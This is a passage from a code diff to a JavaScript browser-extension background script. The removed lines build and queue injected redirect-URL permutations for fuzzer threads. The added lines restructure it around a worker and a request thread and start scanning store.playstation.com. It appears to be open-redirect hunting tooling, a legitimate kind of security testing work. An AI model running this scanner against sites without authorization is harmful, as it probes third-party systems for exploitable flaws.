-      if (exploitableURLs.indexOf(exploitableURLsBuffer[0]) === -1) {
-        for (let a = 0; a < redirectURLs.length; a++) {
-          const redirectURLVariants = getURLVariants(redirectURLs[a]);
-          const chunkedRedirectURLVariants = chunkArrayWithChunkSize(
-            redirectURLVariants,
-            10);
-          for (let b = 0; b < chunkedRedirectURLVariants.length; b++) {
-            const redirectURLVariantsChunk = chunkedRedirectURLVariants[b];
-            for (let c = 0; c < redirectURLVariantsChunk.length; c++) {
-              newInjectedURLs = newInjectedURLs.concat(
-                getInjectedURLPermutations(
-                  exploitableURLsBuffer[0],
-                  redirectURLVariantsChunk[c]));
-            }
-          }
-        }
-        exploitableURLs.push(exploitableURLsBuffer[0]);
-      }
-      exploitableURLsBuffer = exploitableURLsBuffer.slice(1);
-      if (newInjectedURLs.length !== 0) {
-        const chunkedInjectedURLs = chunkArrayWithChunkSize(injectedURLs, 200);
-        newInjectedURLs = newInjectedURLs.filter(async (url, index, arr) => {
-          if (arr.indexOf(url) !== index) {
-            return false;
-          }
-          for (let a = 0; a < chunkedInjectedURLs.length; a++) {
-            const injectedURLsChunk = chunkedInjectedURLs[a];
-            for (let b = 0; b < injectedURLsChunk.length; b++) {
-              if (injectedURLsChunk[b] === url) {
-                return false;
-              }
-            }
-          }
-          return true;
-        });
-        injectedURLs = injectedURLs.concat(newInjectedURLs);
-        const chunkedURLs = chunkArrayToAmountOfChunks(
-          newInjectedURLs,
-          threadCountFuzzer);
-        for (let a = 0; a < chunkedFuzzerQueues.length; a++) {
-          chunkedFuzzerQueues[a] = chunkedFuzzerQueues[a].concat(chunkedURLs[a]);
-        }
-      }
-    }
-    await sleep(delayURLInjectionThread);
+    await sleep(delayTabCleanerThread);
   }
 };
 
@@ -1004,23 +553,18 @@ const trimWhitespaces = str => {
 /**
  * Init background script.
  */
-parseCallbackURLs().then(async () => {
-  for (let a = 0; a < threadCountFuzzer; a++) {
-    chunkedFuzzerQueues[a] = [];
-  }
-  for (let a = 0; a < threadCountScanner; a++) {
-    chunkedScannerQueues[a] = [];
-  }
-  await registerMessageListener();
-  await registerWebRequestListeners();
-  await openFuzzerAndScannerWindows();
-  startForceWakeTabsThread();
-  startPendingRetryURLsThread();
-  startScannerThread();
-  startFuzzerThread();
-  startURLInjectionThread();
-  startTabWatcherThread();
+(() => {
+  parseCallbackURLs().then(async () => {
+    worker.postMessage({threadCount: threadCount});
+    await registerMessageListener();
+    await registerWebRequestListeners();
+    await openWindow();
+    startForceWakeTabsThread();
+    startPendingRetryURLsThread();
+    startRequestThread();
+    startTabCleanerThread();
 
-  openURLInNewScannerTab("https://store.playstation.com/");
-});
+    openURLInNewTab("https://store.playstation.com/");
+  });
+})();
 
